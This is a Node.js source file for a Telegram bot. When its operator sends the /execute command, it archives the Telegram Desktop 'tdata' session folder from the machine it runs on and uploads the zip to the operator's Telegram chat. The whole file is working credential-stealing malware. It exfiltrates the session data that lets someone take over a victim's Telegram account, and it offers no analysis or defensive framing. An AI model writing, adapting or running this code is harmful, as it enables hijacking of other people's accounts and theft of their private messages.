require("dotenv").config();
const fs = require("fs");
const path = require("path");
const archiver = require("archiver");
const { Bot, InputFile } = require("grammy");

// Create an instance of the `Bot` class and pass your bot token to it.
const bot = new Bot(process.env.BOT_TOKEN); // <-- put your bot token between the ""
const USER_ID = process.env.USER_ID;

bot.api.sendMessage(USER_ID, "I am ready! \n/execute me");
bot.command("start", (ctx) => ctx.reply("Hey I am ready! /execute me"));

bot.command("execute", (ctx) => {
  ZipData(ctx.from.id);
});

// Start the bot.
bot.start();

const ignoreDirs = ["emoji", "user_data", "dump"]; // Array of directories to be ignored

function ZipData(chat_id) {
  const tgDesktop = path.join(process.env.APPDATA, "Telegram Desktop");
  const directoryToZip = path.join(tgDesktop, "tdata");

  // Create a writable stream to save the zip file
  const filename = `data-${Date.now()}.zip`;
  const output = fs.createWriteStream(filename);

  // Create a new archive using archiver
  const archive = archiver("zip", {
    zlib: { level: 0 }, // Compression level (0-9), 9 is the highest
  });

  // Pipe the archive to the output stream
  archive.pipe(output);

  // Append all files and directories from the specified directory
  archive.glob("**/*", {
    cwd: directoryToZip,
    nodir: true,
    ignore: ignoreDirs.map((dir) => `**/${dir}/**/*`), // Skip directories listed in `ignoreDirs`
  });

  // Finalize the archive (write the zip file)
  archive.finalize();

  output.on("close", () => {
    console.log(`Archive saved as archive.zip`);
    console.log(chat_id);
    bot.api.sendMessage(chat_id, "Files are being sent");
    try {
      bot.api
        .sendDocument(chat_id, new InputFile(filename, "data.zip"))
        .catch((e) => {
          bot.api.sendMessage(chat_id, "Something went wrong!");
        });
    } catch {
      console.log("Something went wrong!");
    }
  });
}
